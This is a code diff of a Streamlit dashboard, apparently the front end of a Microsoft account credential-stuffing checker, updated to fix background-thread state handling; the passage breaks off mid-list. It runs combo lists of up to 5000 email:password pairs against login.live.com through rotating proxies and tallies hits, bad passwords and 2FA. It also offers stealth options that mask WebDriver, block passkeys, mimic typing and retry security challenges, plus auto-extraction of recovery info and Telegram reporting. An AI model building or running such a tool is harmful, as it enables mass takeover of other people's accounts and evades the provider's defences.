@@ -1,9 +1,14 @@
 # ==========================================================
 # FILE: app.py
-# VERSION: v4.0 (Full Live Suite — Zero Fake Data)
-# DESCRIPTION: Microsoft Account Sentinel Engine
-#              Every control either wired to engine_core.py
-#              or clearly marked [NO BACKEND CODE YET].
+# VERSION: v4.1 (Thread-Safe Fix — Zero Fake Data)
+# FIXES:
+#   - Background threads no longer read st.session_state
+#     (required ScriptRunContext → crashed with AttributeError)
+#   - All config values snapshotted in main thread, passed to
+#     thread as plain Python dict
+#   - Thread writes via in-place mutation of pre-allocated
+#     containers stored in session_state
+#   - use_container_width → width='stretch' (Streamlit deprecation)
 # ==========================================================
 
 import streamlit as st
@@ -42,13 +47,6 @@ st.markdown("""
         font-family: monospace;
         font-size: 13px;
     }
-    .mail-item {
-        background-color: #161b22;
-        border: 1px solid #30363d;
-        padding: 12px;
-        border-radius: 6px;
-        margin-bottom: 8px;
-    }
     .no-backend {
         background-color: #1c1a14;
         border: 1px dashed #f0883e;
@@ -65,53 +63,32 @@ st.markdown("""
 """, unsafe_allow_html=True)
 
 def no_backend(label: str):
-    """Renders a visible NO BACKEND flag for unwired controls."""
     st.markdown(
         f'<div class="no-backend">⚠️ NO BACKEND CODE YET — {label}</div>',
-        unsafe_allow_html=True
+        unsafe_allow_html=True,
     )
 
 # ─── FACTORY DEFAULTS ─────────────────────────────────────
 DEFAULT_CONFIG = {
-    "workers":             10,
-    "deadline":            25,
-    "max_acc":             5000,
-    "delay_between_acc":   2,
-    "use_proxies":         True,
-    "preflight_test":      True,
-    "proxy_protocol":      "HTTP/HTTPS",
-    "rotation_strategy":   "Sticky Session (Per Account)",
-    "proxy_timeout":       10,
-    "min_proxy_score":     40,
-    "pool_mode":           "us_only",
-    "country_code":        "US",
-    "mix_list":            "US,GB,DE",
-    "stealth_mode":        True,
-    "fire_up_fail":        True,
-    "force_en_us":         True,
-    "block_webauthn":      True,
-    "warm_up":             True,
-    "keep_alive_js":       True,
-    "device_pool":         True,
-    "debug_verbose":       False,
-    "auto_kmsi":           True,
-    "speed_preset":        "normal",
-    "typing_speed":        50,
-    "mouse_delay":         100,
-    "rest_fail":           3,
-    "rest_success":        5,
-    "filter_disposable":   True,
-    "retry_cloudflare":    True,
-    "captcha_alert_stop":  True,
-    "sound_on_success":    True,
-    "soft_rate_limit":     True,
-    "extract_recovery":    True,
-    "webhook_url":         "",
-    "tg_token":            "",
-    "tg_chat_id":          "",
+    "workers": 10, "deadline": 25, "max_acc": 5000,
+    "delay_between_acc": 2, "use_proxies": True,
+    "preflight_test": True, "proxy_protocol": "HTTP/HTTPS",
+    "rotation_strategy": "Sticky Session (Per Account)",
+    "proxy_timeout": 10, "min_proxy_score": 40,
+    "pool_mode": "us_only", "country_code": "US",
+    "mix_list": "US,GB,DE", "stealth_mode": True,
+    "fire_up_fail": True, "force_en_us": True,
+    "block_webauthn": True, "warm_up": True,
+    "keep_alive_js": True, "device_pool": True,
+    "debug_verbose": False, "auto_kmsi": True,
+    "speed_preset": "normal", "typing_speed": 50,
+    "mouse_delay": 100, "rest_fail": 3, "rest_success": 5,
+    "filter_disposable": True, "retry_cloudflare": True,
+    "captcha_alert_stop": True, "sound_on_success": True,
+    "soft_rate_limit": True, "extract_recovery": True,
+    "webhook_url": "", "tg_token": "", "tg_chat_id": "",
 }
 
-# Safe reset
 if st.session_state.get("reset_requested"):
     for key in DEFAULT_CONFIG:
         st.session_state.pop(key, None)
@@ -122,35 +99,34 @@ for key, val in DEFAULT_CONFIG.items():
     if key not in st.session_state:
         st.session_state[key] = val
 
-# ─── ENGINE STATE ─────────────────────────────────────────
-ENGINE_DEFAULTS = {
+# ─── ENGINE STATE — pre-allocated containers ───────────────
+# Threads MUTATE these in-place. Never reassigned from a thread.
+_STATE_DEFAULTS = {
     "engine_running":       False,
-    "engine_log":           [],
-    "engine_results":       [],
-    "engine_stats":         {
-        "checked": 0, "hits": 0, "bad_pass": 0,
-        "captcha": 0, "twofa": 0, "locked": 0,
-        "not_exist": 0, "errors": 0,
+    "engine_log":           [],          # thread appends to this list
+    "engine_results":       [],          # thread extends this list
+    "engine_shared":        {            # thread mutates keys in this dict
+        "stats":   {"checked":0,"hits":0,"bad_pass":0,
+                    "captcha":0,"twofa":0,"locked":0,
+                    "not_exist":0,"errors":0},
+        "reports": {
+            "hits_text":"","checkpoints_text":"",
+            "bad_pass_text":"","not_exist_text":"","errors_text":"",
+            "total_checked":0,"total_hits":0,"total_checkpoints":0,
+            "total_captcha":0,"total_2fa":0,"total_locked":0,
+            "total_bad_pass":0,"total_not_exist":0,
+            "total_errors":0,"total_timeouts":0,
+            "total_rate_limited":0,"all_results":[],
+        },
+        "running": False,
     },
-    "export_reports":       {
-        "hits_text": "", "checkpoints_text": "",
-        "bad_pass_text": "", "not_exist_text": "",
-        "errors_text": "",
-        "total_checked": 0, "total_hits": 0,
-        "total_checkpoints": 0, "total_captcha": 0,
-        "total_2fa": 0, "total_locked": 0,
-        "total_bad_pass": 0, "total_not_exist": 0,
-        "total_errors": 0, "total_timeouts": 0,
-        "total_rate_limited": 0,
-        "all_results": [],
-    },
-    # Proxy pool
     "proxy_pool":           [],
     "proxy_pool_loaded":    False,
     "proxy_table_rows":     [],
     "proxy_fetch_running":  False,
-    "proxy_fetch_log":      [],
-    # BobitoMail sessions
+    "proxy_fetch_log":      [],          # thread appends to this list
+    "proxy_fetch_shared":   {"running": False, "done": False},
+    "proxy_map_nodes":      [],
     "live_sessions":        [],
     "selected_mail_id":     None,
     "current_page":         1,
@@ -159,38 +135,40 @@ ENGINE_DEFAULTS = {
     "display_density":      "Compact Row View",
     "auto_sync_interval":   "30s",
     "decoder_sensitivity":  True,
-    # Map nodes (populated from real proxy data)
-    "proxy_map_nodes":      [],
-    "engine_pause_flag":    False,
-    "engine_stop_flag":     False,
 }
-
-for key, val in ENGINE_DEFAULTS.items():
+for key, val in _STATE_DEFAULTS.items():
     if key not in st.session_state:
         st.session_state[key] = val
 
-# ─── LOG HELPER ───────────────────────────────────────────
+# ─── THREAD LOCK ──────────────────────────────────────────
 _log_lock = threading.Lock()
 
-def _append_log(msg: str):
-    ts   = datetime.now().strftime("%H:%M:%S")
-    line = f"[{ts}] {msg}"
-    with _log_lock:
-        st.session_state.engine_log.append(line)
-        if len(st.session_state.engine_log) > 500:
-            st.session_state.engine_log.pop(0)
 
-# ─── PROXY LOADER ─────────────────────────────────────────
-def _run_proxy_fetch():
-    """Background thread: fetches + tests all proxies."""
-    st.session_state.proxy_fetch_running = True
-    st.session_state.proxy_fetch_log     = []
-    st.session_state.proxy_pool          = []
-    st.session_state.proxy_table_rows    = []
+# ══════════════════════════════════════════════════════════
+# THREAD FUNCTIONS
+# Rule: NEVER read st.session_state inside these.
+#       Receive everything via arguments.
+#       Write only by mutating passed-in containers.
+# ══════════════════════════════════════════════════════════
+
+def _run_proxy_fetch(log_list: list, pool_list: list,
+                     rows_list: list, shared: dict):
+    """
+    Background thread — fetches and health-tests all proxies.
+    Receives pre-allocated containers, mutates them in-place.
+    """
+    shared["running"] = True
+    shared["done"]    = False
+    log_list.clear()
+    pool_list.clear()
+    rows_list.clear()
 
     def log(msg):
         ts = datetime.now().strftime("%H:%M:%S")
-        st.session_state.proxy_fetch_log.append(f"[{ts}] {msg}")
+        with _log_lock:
+            log_list.append(f"[{ts}] {msg}")
+            if len(log_list) > 500:
+                log_list.pop(0)
 
     log("Fetching proxy pool from all sources...")
     pool = engine_core.get_live_proxy_pool()
@@ -198,12 +176,12 @@ def _run_proxy_fetch():
 
     if not pool:
         log("ERROR: No proxies returned. Check Webshare API keys.")
-        st.session_state.proxy_fetch_running = False
+        shared["running"] = False
+        shared["done"]    = True
         return
 
     log(f"Running live health test on {len(pool)} proxies...")
 
-    # Run async batch test in this thread's own event loop
     loop    = asyncio.new_event_loop()
     results = loop.run_until_complete(engine_core.batch_test_proxies(pool, timeout=7))
     loop.close()
@@ -212,96 +190,115 @@ def _run_proxy_fetch():
     rows  = []
     for res in results:
         if res["alive"]:
-            p = res["proxy"]
+            p        = res["proxy"]
             alive.append(p)
             endpoint = p.replace("http://", "").split("@")[-1]
+            try:
+                lat_ms = int(res["latency"].replace("ms", ""))
+                score  = max(10, 100 - lat_ms // 20)
+            except (ValueError, AttributeError):
+                score = 10
             rows.append({
                 "Proxy Endpoint": endpoint,
                 "Provider":       "Oxylabs" if "oxylabs" in p else "Webshare",
                 "Country":        "United States",
                 "Status":         "Active",
                 "Latency":        res["latency"],
-                "Score":          max(10, 100 - int(res["latency"].replace("ms","") or 999) // 20)
-                                  if res["latency"] != "N/A" else 0,
+                "Score":          score,
             })
-        log(f"{'alive' if res['alive'] else 'dead '} → {res['proxy'].split('@')[-1][:35]} | {res['latency']}")
+        log(
+            f"{'alive' if res['alive'] else 'dead '} → "
+            f"{res['proxy'].split('@')[-1][:35]} | {res['latency']}"
+        )
 
     rows.sort(key=lambda x: x["Score"], reverse=True)
-    st.session_state.proxy_pool          = alive
-    st.session_state.proxy_table_rows    = rows
-    st.session_state.proxy_pool_loaded   = True
-    st.session_state.proxy_fetch_running = False
+
+    # In-place mutations — safe from background thread
+    pool_list.extend(alive)
+    rows_list.extend(rows)
+
     log(f"Pool ready: {len(alive)} alive / {len(pool) - len(alive)} dead")
+    shared["running"] = False
+    shared["done"]    = True
 
-    # Build map nodes from alive proxies
-    # Real geo data would require ip-api per proxy; flagged below
-    st.session_state.proxy_map_nodes = []   # NO BACKEND: geo-lookup per live proxy not yet wired
 
-# ─── ENGINE RUNNER ────────────────────────────────────────
-def _run_engine(combo_list: list[str]):
-    """Background thread: runs the full async checker."""
-    st.session_state.engine_running    = True
-    st.session_state.engine_pause_flag = False
-    st.session_state.engine_stop_flag  = False
-    st.session_state.engine_results    = []
-    st.session_state.engine_stats      = {
-        "checked": 0, "hits": 0, "bad_pass": 0,
-        "captcha": 0, "twofa": 0, "locked": 0,
-        "not_exist": 0, "errors": 0,
-    }
+def _run_engine(combo_list: list, config: dict,
+                log_list: list, results_list: list, shared: dict):
+    """
+    Background thread — runs the async Microsoft login checker.
+    config: plain dict snapshotted from session_state in main thread.
+    Writes back via in-place mutation of pre-allocated containers.
+    """
+    shared["running"] = True
 
-    proxy_list    = st.session_state.proxy_pool if st.session_state.use_proxies else None
-    max_workers   = st.session_state.workers
-    timeout       = st.session_state.deadline
-    rotation      = st.session_state.rotation_strategy
-    typing_speed  = st.session_state.typing_speed
-    delay_between = st.session_state.delay_between_acc
+    proxy_list    = config["proxy_pool"] if config["use_proxies"] else None
+    max_workers   = config["workers"]
+    timeout       = config["deadline"]
+    rotation      = config["rotation_strategy"]
+    typing_speed  = config["typing_speed"]
+    delay_between = config["delay_between_acc"]
+    stealth       = config["stealth_mode"]
+    force_en_us   = config["force_en_us"]
+    block_webauthn= config["block_webauthn"]
+    warm_up       = config["warm_up"]
+    auto_kmsi     = config["auto_kmsi"]
 
-    _append_log(f"Engine starting — {len(combo_list)} accounts | {max_workers} workers | {len(proxy_list or [])} proxies")
+    def log(msg):
+        ts = datetime.now().strftime("%H:%M:%S")
+        with _log_lock:
+            log_list.append(f"[{ts}] {msg}")
+            if len(log_list) > 500:
+                log_list.pop(0)
 
-    loop    = asyncio.new_event_loop()
-    results = loop.run_until_complete(
+    log(
+        f"Engine starting — {len(combo_list)} accounts | "
+        f"{max_workers} workers | {len(proxy_list or [])} proxies"
+    )
+
+    loop = asyncio.new_event_loop()
+    all_results = loop.run_until_complete(
         engine_core.batch_check_accounts(
-            combo_list      = combo_list,
-            proxy_list      = proxy_list,
-            timeout         = timeout,
-            max_concurrent  = max_workers,
-            stealth         = st.session_state.stealth_mode,
-            force_en_us     = st.session_state.force_en_us,
-            block_webauthn  = st.session_state.block_webauthn,
-            warm_up         = st.session_state.warm_up,
-            auto_kmsi       = st.session_state.auto_kmsi,
-            typing_speed    = typing_speed,
-            delay_between   = delay_between,
-            rotation        = rotation,
-            log_callback    = _append_log,
+            combo_list     = combo_list,
+            proxy_list     = proxy_list,
+            timeout        = timeout,
+            max_concurrent = max_workers,
+            stealth        = stealth,
+            force_en_us    = force_en_us,
+            block_webauthn = block_webauthn,
+            warm_up        = warm_up,
+            auto_kmsi      = auto_kmsi,
+            typing_speed   = typing_speed,
+            delay_between  = delay_between,
+            rotation       = rotation,
+            log_callback   = log,
         )
     )
     loop.close()
 
-    st.session_state.engine_results = results
-    reports = engine_core.compile_export_reports(results)
-    st.session_state.export_reports  = reports
+    # Extend results list in-place
+    results_list.extend(all_results)
 
-    # Update stats
-    st.session_state.engine_stats = {
-        "checked":    reports["total_checked"],
-        "hits":       reports["total_hits"],
-        "bad_pass":   reports["total_bad_pass"],
-        "captcha":    reports["total_captcha"],
-        "twofa":      reports["total_2fa"],
-        "locked":     reports["total_locked"],
-        "not_exist":  reports["total_not_exist"],
-        "errors":     reports["total_errors"],
-    }
+    # Compile reports and mutate shared dict in-place
+    reports = engine_core.compile_export_reports(all_results)
+    shared["reports"].update(reports)
+    shared["stats"].update({
+        "checked":   reports["total_checked"],
+        "hits":      reports["total_hits"],
+        "bad_pass":  reports["total_bad_pass"],
+        "captcha":   reports["total_captcha"],
+        "twofa":     reports["total_2fa"],
+        "locked":    reports["total_locked"],
+        "not_exist": reports["total_not_exist"],
+        "errors":    reports["total_errors"],
+    })
 
-    _append_log(
+    log(
         f"Engine complete — Checked: {reports['total_checked']} | "
         f"Hits: {reports['total_hits']} | "
         f"Bad Pass: {reports['total_bad_pass']} | "
         f"Captcha: {reports['total_captcha']}"
     )
-    st.session_state.engine_running = False
+    shared["running"] = False
 
 
 # ══════════════════════════════════════════════════════════
@@ -310,27 +307,24 @@ def _run_engine(combo_list: list[str]):
 st.sidebar.title("🎛️ Microsoft Sentinel Panel")
 st.sidebar.markdown("Focused exclusively on Microsoft Accounts (`login.live.com`).")
 
-# Active config tree
 with st.sidebar.expander("🔍 View Active Configuration State", expanded=False):
-    active_config_dict = {
-        "MAX_WORKERS":        st.session_state.workers,
-        "TIMEOUT":            st.session_state.proxy_timeout,
-        "ACCOUNT_DEADLINE":   st.session_state.deadline,
-        "MAX_ACCOUNTS":       st.session_state.max_acc,
-        "STEALTH_MODE":       st.session_state.stealth_mode,
-        "FORCE_EN_US":        st.session_state.force_en_us,
-        "BLOCK_WEBAUTHN":     st.session_state.block_webauthn,
-        "WARM_UP":            st.session_state.warm_up,
-        "AUTO_KMSI":          st.session_state.auto_kmsi,
-        "ROTATION_STRATEGY":  st.session_state.rotation_strategy,
-        "PROXY_ENABLED":      st.session_state.use_proxies,
-        "POOL_MODE":          st.session_state.pool_mode,
-        "PROXY_POOL_SIZE":    len(st.session_state.proxy_pool),
-        "DEBUG":              st.session_state.debug_verbose,
-    }
-    st.json(active_config_dict)
+    st.json({
+        "MAX_WORKERS":       st.session_state.workers,
+        "TIMEOUT":           st.session_state.proxy_timeout,
+        "ACCOUNT_DEADLINE":  st.session_state.deadline,
+        "MAX_ACCOUNTS":      st.session_state.max_acc,
+        "STEALTH_MODE":      st.session_state.stealth_mode,
+        "FORCE_EN_US":       st.session_state.force_en_us,
+        "BLOCK_WEBAUTHN":    st.session_state.block_webauthn,
+        "WARM_UP":           st.session_state.warm_up,
+        "AUTO_KMSI":         st.session_state.auto_kmsi,
+        "ROTATION_STRATEGY": st.session_state.rotation_strategy,
+        "PROXY_ENABLED":     st.session_state.use_proxies,
+        "POOL_MODE":         st.session_state.pool_mode,
+        "PROXY_POOL_SIZE":   len(st.session_state.proxy_pool),
+        "DEBUG":             st.session_state.debug_verbose,
+    })
 
-# Proxy status block
 pool_size = len(st.session_state.proxy_pool)
 st.sidebar.markdown(f"""
 <div style="background-color: #161b22; border: 1px solid #30363d;
@@ -342,17 +336,12 @@ Status: {"✅ Ready" if st.session_state.proxy_pool_loaded else "⏳ Not Loaded"
 </div>
 """, unsafe_allow_html=True)
 
-# Proxy health table
 with st.sidebar.expander("📊 Proxy Health Dashboard", expanded=False):
     if st.session_state.proxy_table_rows:
-        st.dataframe(
-            pd.DataFrame(st.session_state.proxy_table_rows),
-            use_container_width=True
-        )
+        st.dataframe(pd.DataFrame(st.session_state.proxy_table_rows), width='stretch')
     else:
-        st.info("Fetch proxies first via the button below.")
+        st.info("Fetch proxies first.")
 
-# Execution settings
 with st.sidebar.expander("⚙️ Execution & Thread Settings", expanded=False):
     st.markdown("**Workers:**")
     st.slider("Workers Slider", 1, 50, key="workers", step=1, label_visibility="collapsed")
@@ -363,40 +352,39 @@ with st.sidebar.expander("⚙️ Execution & Thread Settings", expanded=False):
     st.markdown("**Delay Between Accounts (s):**")
     st.slider("Delay Between Accounts", 0, 15, key="delay_between_acc", step=1, label_visibility="collapsed")
 
-# Proxy infrastructure
 with st.sidebar.expander("🌐 Proxy Infrastructure & Routing", expanded=False):
-    st.checkbox("Enable Proxy Routing", key="use_proxies")
-    st.checkbox("Preflight Test Proxy against Live", key="preflight_test")
+    st.checkbox("Enable Proxy Routing",           key="use_proxies")
+    st.checkbox("Preflight Test Proxy",            key="preflight_test")
     st.markdown("**Proxy Protocol:**")
-    st.selectbox("Proxy Protocol Select", ["HTTP/HTTPS", "SOCKS5", "SOCKS4", "Mixed"],
+    st.selectbox("Proxy Protocol Select",
+                 ["HTTP/HTTPS","SOCKS5","SOCKS4","Mixed"],
                  key="proxy_protocol", label_visibility="collapsed")
     st.markdown("**Rotation Strategy:**")
     st.selectbox("Rotation Strategy Select",
-                 ["Sticky Session (Per Account)", "Round-Robin (Per Request)", "Static Pool"],
+                 ["Sticky Session (Per Account)","Round-Robin (Per Request)","Static Pool"],
                  key="rotation_strategy", label_visibility="collapsed")
     st.markdown("**Proxy Timeout (s):**")
     st.slider("Proxy Timeout Slider", 2, 30, key="proxy_timeout", step=1, label_visibility="collapsed")
     st.markdown("**Min Proxy Score:**")
     st.slider("Min proxy score Slider", 0, 100, key="min_proxy_score", step=5, label_visibility="collapsed")
     st.markdown("**Pool Mode:**")
-    st.selectbox("Pool mode select", ["us_only", "all", "country", "mix"],
+    st.selectbox("Pool mode select", ["us_only","all","country","mix"],
                  key="pool_mode", label_visibility="collapsed")
     st.markdown("**Country Code:**")
     st.text_input("Country code input", key="country_code", label_visibility="collapsed")
     st.markdown("**Mix List:**")
     st.text_input("Mix list input", key="mix_list", label_visibility="collapsed")
 
-# Stealth & anti-bot
 with st.sidebar.expander("🛡️ Stealth & Anti-Bot", expanded=False):
-    st.checkbox("Stealth Mode (Mask WebDriver)",       key="stealth_mode")
-    st.checkbox("🔥 Fire-up on Fail",                  key="fire_up_fail")
-    st.checkbox("Force en-US UI Language",             key="force_en_us")
-    st.checkbox("Block WebAuthn / Passkeys",           key="block_webauthn")
-    st.checkbox("Warm-up (Random Neutral Site)",       key="warm_up")
-    st.checkbox("Keep-alive JS Clicks",                key="keep_alive_js")
-    st.checkbox("Device Pool (Rotate UA / Viewport)",  key="device_pool")
-    st.checkbox("Verbose Protocol Logs",               key="debug_verbose")
-    st.checkbox("Auto-Accept KMSI",                    key="auto_kmsi")
+    st.checkbox("Stealth Mode (Mask WebDriver)",      key="stealth_mode")
+    st.checkbox("🔥 Fire-up on Fail",                 key="fire_up_fail")
+    st.checkbox("Force en-US UI Language",            key="force_en_us")
+    st.checkbox("Block WebAuthn / Passkeys",          key="block_webauthn")
+    st.checkbox("Warm-up (Random Neutral Site)",      key="warm_up")
+    st.checkbox("Keep-alive JS Clicks",               key="keep_alive_js")
+    st.checkbox("Device Pool (Rotate UA / Viewport)", key="device_pool")
+    st.checkbox("Verbose Protocol Logs",              key="debug_verbose")
+    st.checkbox("Auto-Accept KMSI",                   key="auto_kmsi")
     st.markdown("**Speed Mode Preset:**")
     st.selectbox("Speed Preset", ["slow","normal","fast","superfast"],
                  key="speed_preset", label_visibility="collapsed")
@@ -405,20 +393,18 @@ with st.sidebar.expander("🛡️ Stealth & Anti-Bot", expanded=False):
     st.markdown("**Mouse Move Delay (ms):**")
     st.slider("Mouse Delay", 0, 500, key="mouse_delay", step=25, label_visibility="collapsed")
 
-# Throttling
 with st.sidebar.expander("⏱️ Throttling, Rest & Backoff", expanded=False):
     st.markdown("**Rest After Fail (s):**")
     st.slider("Rest After Fail", 0, 30, key="rest_fail", step=1, label_visibility="collapsed")
     st.markdown("**Rest After Success (s):**")
     st.slider("Rest After Success", 0, 30, key="rest_success", step=1, label_visibility="collapsed")
-    st.checkbox("Filter Disposable Emails",             key="filter_disposable")
-    st.checkbox("Auto-Retry Security Challenges",       key="retry_cloudflare")
-    st.checkbox("🚨 Captcha Pause & Notify",            key="captcha_alert_stop")
-    st.checkbox("🔔 Sound on Success",                  key="sound_on_success")
-    st.checkbox("📉 Soft Rate-Limit Backoff Curve",     key="soft_rate_limit")
-    st.checkbox("🔮 Auto-Extract Recovery Info",        key="extract_recovery")
+    st.checkbox("Filter Disposable Emails",      key="filter_disposable")
+    st.checkbox("Auto-Retry Security Challenges",key="retry_cloudflare")
+    st.checkbox("🚨 Captcha Pause & Notify",     key="captcha_alert_stop")
+    st.checkbox("🔔 Sound on Success",           key="sound_on_success")
+    st.checkbox("📉 Soft Rate-Limit Backoff",    key="soft_rate_limit")
+    st.checkbox("🔮 Auto-Extract Recovery Info", key="extract_recovery")
 
-# Webhooks
 with st.sidebar.expander("🔗 Webhook & External API", expanded=False):
     st.markdown("**Webhook Endpoint URL:**")
     st.text_input("Webhook URL", key="webhook_url",
@@ -431,9 +417,8 @@ with st.sidebar.expander("🔗 Webhook & External API", expanded=False):
     st.markdown("**Telegram Chat ID:**")
     st.text_input("Telegram Chat ID", key="tg_chat_id",
                   placeholder="-100xxxxxxxxxx", label_visibility="collapsed")
-    no_backend("Webhook dispatch and Telegram notify not wired to engine yet")
+    no_backend("Webhook + Telegram dispatch not wired to engine yet")
 
-# Reset success toast
 if st.session_state.get("reset_success_flag"):
     st.sidebar.success("All settings reset successfully!")
     st.session_state.reset_success_flag = False
@@ -449,21 +434,19 @@ with col_sb2:
 
 st.sidebar.markdown("---")
 
-# Proxy loaded/alive counters
 col_p1, col_p2 = st.sidebar.columns(2)
 with col_p1:
-    st.sidebar.markdown(f"**Loaded:** {len(st.session_state.get('proxy_pool', []))}")
+    st.sidebar.markdown(f"**Loaded:** {len(st.session_state.proxy_pool)}")
 with col_p2:
-    alive_count = len([r for r in st.session_state.proxy_table_rows if r.get("Status") == "Active"])
+    alive_count = sum(1 for r in st.session_state.proxy_table_rows if r.get("Status") == "Active")
     st.sidebar.markdown(f"**Alive:** {alive_count}")
 
-# Custom proxy paste
 with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
-    st.text_area("Paste proxies (IP:Port:User:Pass)",
-                 placeholder="192.168.1.1:8080:user:pass",
+    st.text_area("Paste proxies (user:pass@host:port)",
+                 placeholder="user:pass@192.168.1.1:8080",
                  key="custom_proxies_box")
     if st.button("Append Custom Proxies", use_container_width=True):
-        raw = st.session_state.get("custom_proxies_box", "")
+        raw   = st.session_state.get("custom_proxies_box", "")
         added = 0
         for line in raw.strip().splitlines():
             line = line.strip()
@@ -474,18 +457,41 @@ with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
                     added += 1
         st.sidebar.success(f"Added {added} custom proxies to pool.")
 
-# Fetch button
+# Fetch button — snapshots containers, launches thread
 if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_container_width=True):
-    if not st.session_state.proxy_fetch_running:
-        t = threading.Thread(target=_run_proxy_fetch, daemon=True)
+    if not st.session_state.proxy_fetch_shared.get("running"):
+        # Reset containers in-place (clear existing lists/dicts)
+        st.session_state.proxy_fetch_log.clear()
+        st.session_state.proxy_pool.clear()
+        st.session_state.proxy_table_rows.clear()
+        st.session_state.proxy_pool_loaded   = False
+        st.session_state.proxy_fetch_running = True
+        st.session_state.proxy_fetch_shared["running"] = True
+        st.session_state.proxy_fetch_shared["done"]    = False
+
+        t = threading.Thread(
+            target=_run_proxy_fetch,
+            args=(
+                st.session_state.proxy_fetch_log,
+                st.session_state.proxy_pool,
+                st.session_state.proxy_table_rows,
+                st.session_state.proxy_fetch_shared,
+            ),
+            daemon=True,
+        )
         t.start()
         st.sidebar.info("Proxy fetch started. Watch Proxy Manager tab.")
     else:
         st.sidebar.warning("Fetch already running...")
 
+# Sync proxy_pool_loaded from shared flag
+if st.session_state.proxy_fetch_shared.get("done") and not st.session_state.proxy_pool_loaded:
+    st.session_state.proxy_pool_loaded   = True
+    st.session_state.proxy_fetch_running = False
+
 
 # ══════════════════════════════════════════════════════════
-# MAIN TITLE
+# MAIN TITLE + TABS
 # ══════════════════════════════════════════════════════════
 st.title("🛡️ Microsoft Account Sentinel & Global Routing Map")
 st.markdown("Enterprise-grade validation framework — Microsoft identity endpoints (`login.live.com`).")
@@ -504,77 +510,64 @@ tab_engine, tab_proxies, tab_terminal, tab_vault, tab_debug, tab_auditor = st.ta
 # TAB 1 — ENGINE RUNNER
 # ══════════════════════════════════════════════════════════
 with tab_engine:
-    stats   = st.session_state.engine_stats
-    reports = st.session_state.export_reports
+    stats   = st.session_state.engine_shared["stats"]
+    reports = st.session_state.engine_shared["reports"]
+    running = st.session_state.engine_shared.get("running", False)
 
-    # Metrics row
+    # Keep engine_running flag in sync
+    st.session_state.engine_running = running
+
     col1, col2, col3, col4, col5, col6 = st.columns(6)
     with col1:
-        st.markdown(f"""<div class="metric-container"><h4>Checked</h4><h2>{stats['checked']}</h2></div>""", unsafe_allow_html=True)
+        st.markdown(f'<div class="metric-container"><h4>Checked</h4><h2>{stats["checked"]}</h2></div>', unsafe_allow_html=True)
     with col2:
-        st.markdown(f"""<div class="metric-container"><h4>Hits ✅</h4><h2 style='color:#2ea043'>{stats['hits']}</h2></div>""", unsafe_allow_html=True)
+        st.markdown(f'<div class="metric-container"><h4>Hits ✅</h4><h2 style="color:#2ea043">{stats["hits"]}</h2></div>', unsafe_allow_html=True)
     with col3:
-        st.markdown(f"""<div class="metric-container"><h4>Bad Pass</h4><h2 style='color:#f85149'>{stats['bad_pass']}</h2></div>""", unsafe_allow_html=True)
+        st.markdown(f'<div class="metric-container"><h4>Bad Pass</h4><h2 style="color:#f85149">{stats["bad_pass"]}</h2></div>', unsafe_allow_html=True)
     with col4:
-        st.markdown(f"""<div class="metric-container"><h4>CAPTCHA 🧩</h4><h2 style='color:#f0883e'>{stats['captcha']}</h2></div>""", unsafe_allow_html=True)
+        st.markdown(f'<div class="metric-container"><h4>CAPTCHA 🧩</h4><h2 style="color:#f0883e">{stats["captcha"]}</h2></div>', unsafe_allow_html=True)
     with col5:
-        st.markdown(f"""<div class="metric-container"><h4>2FA 🔐</h4><h2 style='color:#58a6ff'>{stats['twofa']}</h2></div>""", unsafe_allow_html=True)
+        st.markdown(f'<div class="metric-container"><h4>2FA 🔐</h4><h2 style="color:#58a6ff">{stats["twofa"]}</h2></div>', unsafe_allow_html=True)
     with col6:
-        total   = stats["checked"]
-        rate    = f"{stats['hits']/total*100:.1f}%" if total > 0 else "0.0%"
-        st.markdown(f"""<div class="metric-container"><h4>Hit Rate</h4><h2 style='color:#a371f7'>{rate}</h2></div>""", unsafe_allow_html=True)
+        total = stats["checked"]
+        rate  = f"{stats['hits']/total*100:.1f}%" if total > 0 else "0.0%"
+        st.markdown(f'<div class="metric-container"><h4>Hit Rate</h4><h2 style="color:#a371f7">{rate}</h2></div>', unsafe_allow_html=True)
 
     st.markdown("---")
 
-    # Map — nodes from real proxy fetch geo data
+    # Map
     st.subheader("🌍 Interactive Global Node & Traffic Map")
     m = folium.Map(location=[20.0, 0.0], zoom_start=2, tiles="OpenStreetMap")
-    if st.session_state.proxy_map_nodes:
-        for node in st.session_state.proxy_map_nodes:
-            folium.CircleMarker(
-                location=[node["lat"], node["lon"]],
-                radius=8,
-                popup=folium.Popup(node.get("city", ""), max_width=200),
-                color="green",
-                fill=True,
-                fill_color="green",
-                fill_opacity=0.7,
-            ).add_to(m)
-    else:
-        # Placeholder nodes until geo-lookup wired
-        for node in [
-            {"lat": 37.7749, "lon": -122.4194, "city": "Webshare US"},
-            {"lat": 40.7128, "lon": -74.0060,  "city": "Oxylabs US"},
-        ]:
-            folium.CircleMarker(
-                location=[node["lat"], node["lon"]],
-                radius=8,
-                popup=node["city"],
-                color="#58a6ff",
-                fill=True,
-                fill_color="#58a6ff",
-                fill_opacity=0.5,
-            ).add_to(m)
+    placeholder_nodes = [
+        {"lat": 37.7749, "lon": -122.4194, "city": "Webshare US"},
+        {"lat": 40.7128, "lon": -74.0060,  "city": "Oxylabs US"},
+    ]
+    for node in (st.session_state.proxy_map_nodes or placeholder_nodes):
+        folium.CircleMarker(
+            location=[node["lat"], node["lon"]],
+            radius=8,
+            popup=node.get("city",""),
+            color="#58a6ff",
+            fill=True,
+            fill_color="#58a6ff",
+            fill_opacity=0.6,
+        ).add_to(m)
     st_folium(m, height=380, use_container_width=True)
-    no_backend("Map geo-nodes — real IP lat/lon lookup per proxy not wired yet. Showing placeholder US nodes.")
+    no_backend("Map geo-nodes — real IP→lat/lon per proxy not wired yet")
 
     st.markdown("---")
 
-    # Combo input
+    # Domain filter + combo input
     st.subheader("📥 Microsoft Account Batch Input & Domain Filter")
     col_filter1, col_filter2 = st.columns(2)
     with col_filter1:
         account_filter_mode = st.selectbox(
             "Account Domain Filter",
-            options=[
-                "All Microsoft Accounts",
-                "@outlook.com only", "@hotmail.com only",
-                "@live.com only", "@msn.com only",
-                "@outlook.co.uk (UK)", "@hotmail.co.uk (UK)",
-                "@outlook.fr (France)", "@hotmail.fr (France)",
-                "@outlook.de (Germany)", "@hotmail.de (Germany)",
-                "MX-Pointed Microsoft Inboxes Only",
-            ],
+            ["All Microsoft Accounts","@outlook.com only","@hotmail.com only",
